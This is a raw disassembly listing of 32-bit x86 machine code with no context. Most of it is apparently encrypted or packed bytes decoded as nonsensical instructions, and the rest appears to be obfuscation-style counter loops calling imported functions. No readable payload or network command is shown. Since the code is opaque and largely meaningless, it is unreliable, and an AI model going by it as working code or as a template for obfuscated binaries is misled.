  40a111:	adc    DWORD PTR [ecx],0x30
  40a114:	out    0xe0,al
  40a116:	add    cl,BYTE PTR [ebp-0x12]
  40a119:	fwait
  40a11a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a11b:	mov    ds:0x52b3f388,eax
  40a120:	gs jmp 0x40a157
  40a123:	sub    BYTE PTR [ecx],bl
  40a125:	mov    ?,WORD PTR [ebx-0x1d80486f]
  40a12b:	std    
  40a12c:	adc    ebx,DWORD PTR [edi]
  40a12e:	xchg   esp,eax
  40a12f:	xchg   esp,eax
  40a130:	cwde   
  40a131:	mov    al,0xaf
  40a133:	adc    eax,0x7d15318f
  40a138:	sti    
  40a139:	pushf  
  40a13a:	adc    eax,DWORD PTR [edi]
  40a13c:	adc    BYTE PTR [edi+0x382a5bd0],ah
  40a142:	pop    esi
  40a143:	in     al,dx
  40a144:	mov    ebp,0xce638670
  40a149:	xor    eax,0x7c77edc6
  40a14e:	retf   0x99dc
  40a151:	pop    edi
  40a152:	std    
  40a153:	lods   al,BYTE PTR ds:[esi]
  40a154:	xor    ebx,edi
  40a156:	or     al,0x44
  40a158:	mov    edi,0x2a92ac53
  40a15d:	jge    0x40a19f
  40a15f:	push   edi
  40a160:	lods   al,BYTE PTR ds:[esi]
  40a161:	push   eax
  40a162:	cld    
  40a163:	inc    esp
  40a164:	jg     0x40a1d2
  40a166:	mov    dl,0xba
  40a168:	(bad)
  40a16b:	lods   eax,DWORD PTR ds:[esi]
  40a16d:	cs pop ecx
  40a16f:	sub    dh,dl
  40a171:	cmp    edi,0x17
  40a174:	mov    edx,0xf7b3092e
  40a179:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a17a:	pop    ds
  40a17b:	pop    es
  40a17c:	jmp    0x38e626d
  40a181:	scas   eax,DWORD PTR es:[edi]
  40a182:	inc    ebp
  40a183:	mov    al,ds:0x4c9d3bb9
  40a188:	cdq    
  40a189:	mov    ?,WORD PTR [ecx+0x4]
  40a18c:	jmp    0x50e:0x737d3498
  40a193:	mov    ebx,0x50f662df
  40a198:	fld    QWORD PTR [esi]
  40a19a:	inc    eax
  40a19b:	sti    
  40a19c:	lods   al,BYTE PTR ds:[esi]
  40a19d:	mov    ds:0x419ce834,eax
  40a1a2:	jns    0x40a1a6
  40a1a4:	cli    
  40a1a5:	sbb    esp,DWORD PTR [edi-0x65e6dc72]
  40a1ab:	dec    edi
  40a1ac:	sub    ebp,DWORD PTR [edx+0x6d]
  40a1af:	mov    ebx,0xeef8b1a3
  40a1b4:	cwde   
  40a1b5:	mov    ds:0x4d6fecb6,al
  40a1ba:	jmp    0x40a162
  40a1bc:	inc    edx
  40a1bd:	pop    esp
  40a1be:	iret   
  40a1bf:	sub    esi,DWORD PTR [esi]
  40a1c1:	and    BYTE PTR [ebp+0xa4d0e23],dl
  40a1c7:	fs mov dh,0x76
  40a1ca:	std    
  40a1cb:	mov    dl,0x34
  40a1cd:	in     al,0x1
  40a1cf:	fcmovbe st,st(5)
  40a1d1:	imul   esi,edi,0x73a8d736
  40a1d7:	jne    0x40a18d
  40a1d9:	fisub  WORD PTR [ecx+ebp*4+0x4ffd32b4]
  40a1e0:	sub    esi,ecx
  40a1e2:	fisttp DWORD PTR [esi-0x4c05df2e]
  40a1e8:	cmc    
  40a1e9:	fst    DWORD PTR [eax]
  40a1eb:	fdivr  DWORD PTR [esi]
  40a1ed:	repz data16 rol BYTE PTR [eax+0xa],0x36
  40a1f3:	pop    ebp
  40a1f4:	xor    DWORD PTR [ebp-0x38],ebx
  40a1f7:	std    
  40a1f8:	aam    0x6e
  40a1fa:	jmp    0xcf92:0x3f0c435a
  40a201:	rcl    BYTE PTR [ebp-0x34],0x1a
  40a205:	and    eax,0x4de20c52
  40a20a:	mov    ch,0xc1
  40a20c:	lods   al,BYTE PTR ds:[esi]
  40a20d:	out    0x5,eax
  40a20f:	jle    0x40a1fb
  40a211:	or     DWORD PTR [ebp+eiz*4+0x16a1f90c],edx
  40a218:	jmp    0x3d63:0xb53b4934
  40a21f:	aam    0x81
  40a221:	stc    
  40a222:	ins    BYTE PTR es:[edi],dx
  40a223:	in     eax,dx
  40a224:	mov    edx,0x267296af
  40a229:	test   eax,0x4c3642a5
  40a22e:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  40a235:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  40a23c:	adc    edx,edx
  40a23e:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  40a245:	and    DWORD PTR ds:0x42fd6d,0x0
  40a24f:	jmp    0x40a263
  40a254:	xor    edx,edx
  40a256:	or     edx,DWORD PTR ds:0x42fd6d
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fd6d,edx
  40a263:	cmp    DWORD PTR ds:0x42fd6d,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fd6d,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e367
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e1a8,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e78f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	xchg   BYTE PTR [esi-0xaba3d9f],bl
  40a2ca:	jo     0x40a33c
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a2a8
  40a2d1:	pop    edx
  40a2d2:	sub    esp,DWORD PTR [esi+ebx*4+0x20]
  40a2d6:	in     al,0x3f
  40a2d8:	mov    ds:0x179505f,eax
  40a2dd:	add    esi,esp
  40a2df:	ds in  eax,dx
  40a2e1:	jle    0x40a273
  40a2e3:	mov    edx,0x47db1cda
  40a2e8:	jmp    0x40a369
  40a2ea:	call   0xe576:0xd1e0116
  40a2f1:	and    eax,0xb36e952e
  40a2f6:	mov    edi,DWORD PTR [esi]
  40a2f8:	cmp    al,0x37
  40a2fa:	mov    ds:0xe412b0bd,al
  40a2ff:	ja     0x40a32c
  40a301:	mov    ds:0x35684bd2,eax
  40a306:	xor    DWORD PTR [edi+eax*8-0x19],0x1e6bfd2
  40a30e:	jle    0x40a2dc
  40a310:	xor    edi,DWORD PTR fs:[ebx-0x16]
  40a314:	lea    esp,[esi]
  40a316:	enter  0x9ee8,0xe
  40a31a:	aam    0xfb
  40a31c:	xchg   esi,eax
  40a31d:	add    BYTE PTR [ebx],ch
  40a31f:	(bad)  
  40a320:	icebp  
  40a321:	jns    0x40a32b
  40a323:	int    0x89
  40a325:	hlt    
  40a326:	inc    eax
  40a327:	jge    0x40a362
  40a329:	mov    WORD PTR [esi+ebx*2],?
  40a32c:	pop    ds
  40a32d:	jecxz  0x40a309
  40a32f:	push   cs
  40a330:	retf   
  40a331:	xor    dl,BYTE PTR [ebp-0x33620bd8]
  40a337:	call   0xa8b:0x8ac317e1
  40a33e:	adc    BYTE PTR [ecx+0x1ba86db6],bh
  40a344:	jae    0x40a2d2
  40a346:	mov    cl,0xe6
  40a348:	add    BYTE PTR [edi+eax*4-0x3c],0xa2
  40a34d:	lock xor edx,DWORD PTR [edi-0x3e9e7297]
  40a354:	adc    ebx,DWORD PTR [edi]
  40a356:	sbb    BYTE PTR [ebx+0x743e1841],ch
  40a35c:	jns    0x40a336
  40a35e:	mov    ds:0xf561a5b3,eax
  40a363:	jle    0x40a343
  40a365:	cmp    DWORD PTR [edx-0x6b99fc33],esi
  40a36b:	add    eax,0xca8cbf2c
  40a370:	xor    eax,0xb4d7a219
  40a375:	retf   0x5fee
  40a378:	mov    dh,0xf5
  40a37a:	mov    ch,0x59
  40a37c:	mov    ch,BYTE PTR [eax]
  40a37e:	or     dl,al
  40a380:	xchg   esp,eax
  40a381:	xchg   ecx,eax
  40a382:	std    
  40a383:	fwait
  40a384:	out    dx,al
  40a385:	imul   eax,DWORD PTR [eax],0x8b19f660
  40a38b:	in     al,dx
  40a38c:	int3   
  40a38d:	xchg   edi,eax
  40a38e:	dec    ebp
  40a38f:	mov    ds:0x6d9552dd,al
  40a394:	xchg   ebp,eax
  40a395:	xor    DWORD PTR [ebx+0x5b],esi
  40a398:	lahf   
  40a399:	sahf   
  40a39a:	test   al,0xdc
  40a39c:	mov    al,0x7b
  40a39e:	push   cs
  40a39f:	cmp    eax,0xe69ecec
  40a3a4:	in     al,dx
  40a3a5:	rcl    BYTE PTR [eax+0x44],1
  40a3a8:	loopne 0x40a3e0
  40a3aa:	aad    0xfb
  40a3ac:	mov    ch,0xfd
  40a3ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3af:	mov    dl,0xf5
  40a3b1:	sub    esi,DWORD PTR [edx+0xf924281]
  40a3b7:	inc    esi
  40a3b8:	pop    ebp
  40a3b9:	scas   eax,DWORD PTR es:[edi]
  40a3ba:	and    DWORD PTR [edi],0x60
  40a3bd:	sbb    DWORD PTR [ebx+ecx*1-0x438c4543],eax
  40a3c4:	in     eax,dx
  40a3c5:	add    eax,0xdf5ee145
  40a3ca:	hlt    
  40a3cb:	jg     0x40a3a0
  40a3cd:	gs xchg esi,eax
  40a3cf:	adc    eax,0xf6cf083
  40a3d4:	ror    DWORD PTR [esi+ebx*1-0x35],1
  40a3d8:	add    DWORD PTR [eax+0x6535bd2d],edx
  40a3de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3df:	aas    
  40a3e0:	mov    ebx,0xb617d12d
  40a3e5:	cmc    
  40a3e6:	and    al,0x76
  40a3e8:	(bad)  
  40a3e9:	sub    eax,0x29346e5e
  40a3ee:	xchg   esi,eax
  40a3ef:	lods   eax,DWORD PTR ds:[esi]
  40a3f0:	jmp    0xcdf2:0xb16a558c
  40a3f7:	mov    cl,0x1
  40a3f9:	aas    
  40a3fa:	xor    BYTE PTR ds:0x62adf74,bl
  40a400:	aad    0xfa
  40a402:	cmp    al,0x38
  40a404:	les    esp,FWORD PTR [eax]
  40a406:	pop    ss
  40a407:	adc    al,0xa
  40a409:	fisubr WORD PTR [esi+0x34]
  40a40c:	adc    al,0xf2
  40a40e:	in     al,dx
  40a40f:	mov    ecx,0x194ba9ad
  40a414:	out    0xd3,eax
  40a416:	mov    dl,0x22
  40a418:	jae    0x40a491
  40a41a:	icebp  
  40a41b:	loop   0x40a476
  40a41d:	pop    esi
  40a41e:	addr16 cwde 
  40a420:	xor    eax,0x4a18ec80
  40a425:	jecxz  0x40a3f1
  40a427:	call   0x4c77:0x2029319e
  40a42e:	push   ds
  40a42f:	cwde   
  40a430:	cmp    eax,0x6c41a7e
  40a435:	and    BYTE PTR [edx-0x1b950bbc],bl
  40a43b:	inc    edx
  40a43c:	mov    ch,0x3
  40a43e:	jb     0x40a470
  40a440:	add    al,dh
  40a442:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a443:	stos   BYTE PTR es:[edi],al
  40a444:	out    dx,al
  40a445:	sub    ecx,ebp
  40a447:	mov    ch,0x58
  40a449:	jns    0x40a443
  40a44b:	sbb    BYTE PTR [esi-0x5c],bh
  40a44e:	xchg   esi,eax
  40a44f:	sub    al,0x68
  40a451:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a452:	not    BYTE PTR [edx]
  40a454:	cmp    BYTE PTR [edx+edi*4-0x53],dl
  40a458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a459:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a45a:	jmp    0xb20f17c8
  40a45f:	cmp    eax,0xa52079e
  40a464:	pop    edi
  40a465:	xor    eax,0xa210b22d
  40a46a:	sub    DWORD PTR [ebp+0x79a3ab9e],ecx
  40a470:	repz clc 
  40a472:	call   0xcdbd:0xe8f1a2e7
  40a479:	(bad)
  40a47c:	push   0x8344f755
  40a481:	fdiv   DWORD PTR [ebx]
  40a483:	out    0x21,eax
  40a485:	retf   0x9482
  40a488:	cs in  al,dx
  40a48a:	mov    al,0xd5
  40a48c:	dec    ebp
  40a48d:	scas   eax,DWORD PTR es:[edi]
  40a48e:	lahf   
  40a48f:	mov    edx,0x2b769232
  40a494:	push   ss
  40a495:	loop   0x40a462
  40a497:	rol    BYTE PTR [edi],1
  40a499:	stc    
  40a49a:	jp     0x40a4c5
  40a49c:	mov    ebp,0xd2f6ee8a
  40a4a1:	cld    
  40a4a2:	sub    ch,BYTE PTR [ecx-0x3f]
  40a4a5:	pop    ecx
  40a4a6:	popf   
  40a4a7:	(bad)  
  40a4a9:	xchg   esp,eax
  40a4aa:	push   0xa23a7d27
  40a4af:	sahf   
  40a4b0:	pop    edx
  40a4b1:	scas   al,BYTE PTR es:[edi]
  40a4b2:	or     DWORD PTR [eax-0x1125f198],edi
  40a4b8:	arpl   WORD PTR [esi],dx
  40a4ba:	adc    DWORD PTR [ebx-0x6c444ea3],ebp
  40a4c0:	outs   dx,DWORD PTR ds:[esi]
  40a4c1:	call   0xda1c:0xe7fb5f22
  40a4c8:	popf   
  40a4c9:	mov    al,0x2d
  40a4cb:	out    dx,eax
  40a4cc:	push   ss
  40a4cd:	fidiv  WORD PTR [edx+esi*4-0x72]
  40a4d1:	and    eax,0xba8ed796
  40a4d6:	cmp    ecx,DWORD PTR [edx+0xb]
  40a4d9:	jae    0x40a49f
  40a4db:	sub    dh,BYTE PTR [edx-0x78]
  40a4de:	test   eax,0x8195bfcd
  40a4e3:	aaa    
  40a4e4:	cmp    al,0x7f
  40a4e6:	repz xor esp,DWORD PTR [eax]
  40a4e9:	inc    esp
  40a4ea:	mov    al,ds:0xb11ee85c
  40a4ef:	adc    edx,DWORD PTR [esi+0x6aa81729]
  40a4f5:	push   eax
  40a4f6:	jl     0x40a54e
  40a4f8:	mov    BYTE PTR [ecx],ch
  40a4fa:	and    BYTE PTR [edx],ch
  40a4fc:	aaa    
  40a4fd:	inc    eax
  40a4fe:	push   ebx
  40a4ff:	loop   0x40a559
  40a501:	push   ss
  40a502:	jmp    0x9b9323c7
  40a507:	das    
  40a508:	mov    WORD PTR [ecx+edx*1+0x39],es
  40a50c:	push   ss
  40a50d:	jo     0x40a536
  40a50f:	and    edx,edx
  40a511:	push   ss
  40a512:	retf   
  40a513:	adc    DWORD PTR [eax-0x61696271],0xa4a0a1f6
  40a51d:	sub    al,ah
  40a51f:	dec    ebp
  40a520:	sbb    bh,bh
  40a522:	push   edi
  40a523:	int3   
  40a524:	loope  0x40a4e1
  40a526:	inc    ecx
  40a527:	lods   eax,DWORD PTR ds:[esi]
  40a528:	mov    edx,0xe1cca32c
  40a52d:	test   DWORD PTR [ebx-0x9],edx
  40a530:	out    dx,al
  40a531:	jecxz  0x40a567
  40a533:	sbb    ebx,DWORD PTR [eax]
  40a535:	adc    DWORD PTR [edx+eiz*2+0x4c],ebp
  40a539:	push   es
  40a53a:	jo     0x40a5b8
  40a53c:	ins    DWORD PTR es:[edi],dx
  40a53d:	ds push ds
  40a53f:	mov    ebx,0x7d0b652
  40a544:	fsubr  DWORD PTR [ebp-0x4f]
  40a547:	adc    edi,DWORD PTR [esi]
  40a549:	xor    ecx,DWORD PTR [esi+0x71fc4ada]
  40a54f:	xor    BYTE PTR [ebp-0x5e],ah
  40a552:	test   al,0x11
  40a554:	xchg   esi,eax
  40a555:	ficomp DWORD PTR [edx+0x76]
  40a558:	adc    eax,esp
  40a55a:	lea    esi,[eax+0x548aac65]
  40a560:	in     al,dx
  40a561:	sub    dl,ah
  40a563:	(bad)  
  40a565:	sahf   
  40a566:	xor    dl,ah
  40a568:	adc    DWORD PTR [ebx-0x6dfad9b],ebp
  40a56e:	jmp    0x40a59c
  40a570:	xchg   esp,eax
  40a571:	jnp    0x40a5cf
  40a573:	or     esi,DWORD PTR [edx-0x77db6dc5]
  40a579:	mov    cl,0x60
  40a57b:	add    esp,0x70
  40a57e:	div    DWORD PTR [ebx-0x62]
  40a581:	push   ss
  40a582:	push   0xffffffe2
  40a584:	daa    
  40a585:	jp     0x40a529
  40a587:	sbb    BYTE PTR [edi-0x2b],al
  40a58a:	test   al,0x2c
  40a58c:	leave  
  40a58d:	dec    edx
  40a58e:	mov    ds:0x1089efa1,eax
  40a593:	add    esi,0x781aaa55
  40a599:	jb     0x40a56a
  40a59b:	popf   
  40a59c:	jg     0x40a617
  40a59e:	fcom   QWORD PTR [ebx-0x4a]
  40a5a1:	das    
  40a5a2:	dec    edi
  40a5a3:	das    
  40a5a4:	sbb    BYTE PTR [edi+0x23],0xcf
  40a5a8:	int3   
  40a5a9:	mov    bl,0xf9
  40a5ab:	scas   eax,DWORD PTR es:[edi]
  40a5ac:	lds    edx,FWORD PTR [esi+ebp*2+0x28]
  40a5b0:	std    
  40a5b1:	and    dh,BYTE PTR [ebp+0x7b5b3b9]
  40a5b7:	xchg   ebp,eax
  40a5b8:	retf   
  40a5b9:	pop    edi
  40a5ba:	push   ebp
  40a5bb:	jae    0x40a5ff
  40a5bd:	push   cs
  40a5be:	fwait
  40a5bf:	mov    bh,dl
  40a5c1:	sbb    BYTE PTR [ecx],bh
  40a5c3:	and    ebp,DWORD PTR [edi-0x2f2d20a3]
  40a5c9:	in     al,dx
  40a5ca:	out    dx,eax
  40a5cb:	addr16 fwait
  40a5cd:	in     al,0x3c
  40a5cf:	call   0xfbf4:0x6da2b84f
  40a5d6:	sbb    eax,0x2b74528a
  40a5db:	call   0x505b46ae
  40a5e0:	out    0xba,al
  40a5e2:	xchg   esi,eax
  40a5e3:	out    dx,eax
  40a5e4:	sti    
  40a5e5:	js     0x40a5c7
  40a5e7:	push   ebx
  40a5e8:	sbb    eax,0xde2d7b7f
  40a5ed:	shl    BYTE PTR [ebp-0x129c54e5],1
  40a5f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5f4:	sub    edi,ecx
  40a5f6:	sbb    BYTE PTR [edx],ah
  40a5f8:	call   0xf6ff:0x5af69f58
  40a5ff:	scas   eax,DWORD PTR es:[edi]
  40a600:	nop    ebx
  40a603:	popa   
  40a604:	scas   eax,DWORD PTR es:[edi]
  40a605:	dec    edi
  40a606:	sbb    BYTE PTR [ecx+0x24438fdc],dl
  40a60c:	sub    DWORD PTR [edx-0x7446bf93],0xfb266e00
  40a616:	ja     0x40a639
  40a618:	ror    DWORD PTR [ecx-0x1b],0xd3
  40a61c:	ror    BYTE PTR [ecx+0xe],cl
  40a61f:	pop    edi
  40a620:	inc    ebp
  40a621:	pop    ds
  40a622:	ror    BYTE PTR [ecx+ebp*4-0x5c],cl
  40a626:	cld    
  40a627:	aam    0xfd
  40a629:	icebp  
  40a62a:	mov    ah,0x3d
  40a62c:	test   ch,bh
  40a62e:	cld    
  40a62f:	aam    0x13
  40a631:	lds    esi,FWORD PTR [esi]
  40a633:	xlat   BYTE PTR ds:[ebx]
  40a634:	mov    esp,0xbc24955a
  40a639:	test   eax,0xe968fc06
  40a63e:	pop    ecx
  40a63f:	pop    ebx
  40a640:	jb     0x40a5c6
  40a642:	sbb    ax,0x42c6
  40a646:	push   esp
  40a647:	retf   
  40a648:	push   es
  40a649:	in     al,dx
  40a64a:	mov    ecx,0x7239beb5
  40a64f:	mov    ebx,0xd2b7d49e
  40a654:	and    al,0xf
  40a656:	push   ecx
  40a657:	xchg   edx,eax
  40a658:	adc    DWORD PTR [edx+0x2f],ebp
  40a65b:	and    ch,bh
  40a65d:	aaa    
  40a65e:	bound  esi,QWORD PTR [ebp-0x4d368943]
  40a664:	adc    ch,dh
  40a666:	dec    esp
  40a667:	xor    al,0x33
  40a669:	fs push ecx
  40a66b:	fst    QWORD PTR [ecx]
  40a66d:	mov    bh,BYTE PTR [esi+0x42]
  40a670:	mov    al,0xc7
  40a672:	inc    ebp
  40a673:	int3   
  40a674:	cmp    al,0x85
  40a676:	pushf  
  40a677:	clc    
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e76f,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e76f
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e76f,edx
  40a698:	cmp    DWORD PTR ds:0x42e76f,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e777
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e36b
  40a6c6:	cmp    DWORD PTR ds:0x42e76f,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e76f
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e76f,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e76f,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fd5d,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fd5d
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fd5d,edx
  40a709:	cmp    DWORD PTR ds:0x42fd5d,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fd5d,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e2ed
  40a728:	push   0x42e2db
  40a72d:	call   DWORD PTR ds:0x42e5c7
  40a733:	cmp    DWORD PTR ds:0x42fd5d,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fd5d
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fd5d,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e1b4
  40a75a:	xor    edi,DWORD PTR ds:0x42e793
  40a760:	mov    DWORD PTR ds:0x42e1b4,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e793,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fd51
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fd65,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e793,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fd79,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fd89,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e1b0,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e1b0,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e1b0,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e267
  40a7e8:	push   0x42e2bd
  40a7ed:	push   0x42e2bd
  40a7f2:	call   DWORD PTR ds:0x42e36f
  40a7f8:	cmp    DWORD PTR ds:0x42e1b0,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e1b0
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e1b0,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e1b0
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e1b0,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e1ac,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fdee
  40a839:	add    DWORD PTR ds:0x42e787,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	and    edi,DWORD PTR [eax-0x38]
  40a856:	cmp    al,0xe4
  40a858:	icebp  
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a868
  40a860:	das    
  40a861:	dec    ebp
  40a862:	scas   eax,DWORD PTR es:[edi]
  40a863:	mov    WORD PTR [esi],fs
  40a865:	sub    DWORD PTR [edi+0x9304ad7],0xa10e72e8
  40a86f:	bound  ebx,QWORD PTR [esi-0x37]
  40a872:	or     DWORD PTR [edx+0x44a105cf],esi
  40a878:	add    ebx,DWORD PTR [ebp+0x30e3afde]
  40a87e:	stos   DWORD PTR es:[di],eax
  40a880:	ret    
  40a881:	pop    esi
  40a882:	xor    BYTE PTR [esi],dh
  40a884:	xor    eax,0x519ae0ed
  40a889:	xor    DWORD PTR ds:0x71eddcb5,esi
  40a88f:	cld    
  40a890:	cs pop esp
  40a892:	sub    al,0x44
  40a894:	pop    eax
  40a895:	add    DWORD PTR [esi],edi
  40a897:	pop    es
  40a898:	aam    0x5b
  40a89a:	cwde   
  40a89b:	je     0x40a862
  40a89d:	shr    BYTE PTR [esi-0x1c2b497f],1
  40a8a3:	mov    ss,WORD PTR [esi]
  40a8a5:	outs   dx,BYTE PTR ds:[esi]
  40a8a6:	push   eax
  40a8a7:	mov    esi,0x4e9db74c
  40a8ac:	push   ecx
  40a8ad:	mov    esp,0x8f7963dc
  40a8b2:	in     al,dx
  40a8b3:	sbb    eax,0x9bcb766d
  40a8b8:	gs or  al,0xd1
  40a8bb:	and    eax,0xf614ff7b
  40a8c0:	int3   
  40a8c1:	jbe    0x40a854
  40a8c3:	nop
  40a8c4:	inc    ebp
  40a8c5:	mov    BYTE PTR [esi+0x5b],bl
  40a8c8:	push   ebp
  40a8c9:	adc    edi,DWORD PTR [ecx-0x39]
  40a8cc:	add    esi,ecx
  40a8ce:	xchg   DWORD PTR [edi],edx
  40a8d0:	mov    esi,0x8c9e3602
  40a8d5:	xchg   esi,eax
  40a8d6:	mov    dh,BYTE PTR [eax+ebx*1]
  40a8d9:	pop    edx
  40a8da:	xor    ah,dl
  40a8dc:	pop    es
  40a8dd:	dec    esp
  40a8de:	xchg   edx,edi
  40a8e0:	lea    edi,[eax]
  40a8e2:	and    bl,BYTE PTR [edx+0x6cae0fd4]
  40a8e8:	scas   al,BYTE PTR es:[edi]
  40a8e9:	mov    esp,0x815a8a2d
  40a8ee:	add    DWORD PTR [ebp-0x353dcead],0x998ec793
  40a8f8:	out    dx,eax
  40a8f9:	pop    ebp
  40a8fa:	pop    edx
  40a8fb:	xchg   edx,eax
  40a8fc:	inc    ebx
  40a8fd:	push   0xffffffb7
  40a8ff:	mov    ch,0xb
  40a901:	xor    dl,BYTE PTR [edx-0x35]
  40a904:	mov    ch,0xb6
  40a906:	cmp    BYTE PTR [ecx],ah
  40a908:	fwait
  40a909:	jl     0x40a8ef
  40a90b:	cmp    ecx,eax
  40a90d:	cdq    
  40a90e:	loop   0x40a907
  40a910:	cwde   
  40a911:	daa    
  40a912:	mov    dl,0xce
  40a914:	inc    esp
  40a915:	ja     0x40a940
  40a917:	in     eax,dx
  40a918:	mov    ds:0xc00ac506,eax
  40a91d:	xor    al,BYTE PTR [ecx-0x512d639a]
  40a923:	jl     0x40a8d1
  40a925:	scas   al,BYTE PTR es:[edi]
  40a926:	lods   eax,DWORD PTR ds:[esi]
  40a927:	fwait
  40a928:	out    0x3,al
  40a92a:	cmovns edi,DWORD PTR [edx]
  40a92d:	push   esi
  40a92e:	mov    bh,0xcf
  40a930:	or     dh,BYTE PTR [eax]
  40a932:	dec    eax
  40a933:	jecxz  0x40a8df
  40a935:	pop    ebp
  40a936:	push   esi
  40a937:	pop    esi
  40a938:	cmp    edi,esp
  40a93a:	ret    
  40a93b:	bound  ebx,QWORD PTR [edx+0x24]
  40a93e:	sbb    bh,BYTE PTR [esi+ebx*2]
  40a941:	push   esi
  40a942:	popa   
  40a943:	sub    esi,edi
  40a945:	xor    eax,0xbcad2776
  40a94a:	mov    bh,0x56
  40a94c:	sub    ebp,DWORD PTR [esi]
  40a94e:	shl    DWORD PTR [ecx],cl
  40a950:	(bad)  
  40a952:	xor    eax,DWORD PTR [esi]
  40a954:	addr16 data16 in al,0x4b
  40a958:	stc    
  40a959:	dec    esi
  40a95a:	stos   DWORD PTR es:[edi],eax
  40a95b:	sub    ch,BYTE PTR [eax]
  40a95d:	imul   ebp,DWORD PTR [edi+ebx*8],0x10
  40a961:	in     al,dx
  40a962:	push   0xffffff9e
  40a964:	push   ebp
  40a965:	pop    esp
  40a966:	jmp    0x40a9cb
  40a968:	jae    0x40a9ce
  40a96a:	xor    edx,DWORD PTR [esp+esi*4-0x715cb3d]
  40a971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a972:	and    al,0x32
  40a974:	les    ebx,FWORD PTR [ecx+0x6a]
  40a977:	jge    0x40a942
  40a979:	mov    eax,ds:0xbad0d5dd
  40a97e:	ins    BYTE PTR es:[edi],dx
  40a97f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
